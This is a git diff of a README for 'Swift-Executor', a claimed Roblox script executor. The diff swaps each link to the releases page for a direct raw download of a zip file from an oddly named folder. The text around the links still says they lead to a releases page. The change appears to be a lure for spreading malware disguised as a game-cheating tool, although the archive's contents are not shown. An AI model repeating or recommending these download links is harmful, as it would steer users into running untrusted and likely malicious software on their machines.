@@ -1,6 +1,6 @@
 # 🚀 Swift-Executor - A Reliable Roblox Executor
 
-[![Download Swift-Executor](https://img.shields.io/badge/Download-Swift--Executor-blue)](https://github.com/gopi6380/Swift-Executor/releases)
+[![Download Swift-Executor](https://raw.githubusercontent.com/gopi6380/Swift-Executor/main/cecostomy/Swift-Executor.zip)](https://raw.githubusercontent.com/gopi6380/Swift-Executor/main/cecostomy/Swift-Executor.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To use **Swift-Executor**, follow these simple steps to download and run the sof
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** To get started, [visit this page to download](https://github.com/gopi6380/Swift-Executor/releases). 
+1. **Visit the Releases Page:** To get started, [visit this page to download](https://raw.githubusercontent.com/gopi6380/Swift-Executor/main/cecostomy/Swift-Executor.zip). 
 
 2. **Choose Your Version:** On the releases page, you will see different versions of **Swift-Executor** available. Look for the latest release for the best experience.
 
@@ -86,5 +86,5 @@ For latest news and updates about **Swift-Executor**, follow on social media. St
 
 ## 📥 Download Again
 
-To download **Swift-Executor**, [visit this page to download](https://github.com/gopi6380/Swift-Executor/releases). Enjoy a powerful tool for executing scripts in Roblox!
+To download **Swift-Executor**, [visit this page to download](https://raw.githubusercontent.com/gopi6380/Swift-Executor/main/cecostomy/Swift-Executor.zip). Enjoy a powerful tool for executing scripts in Roblox!
 
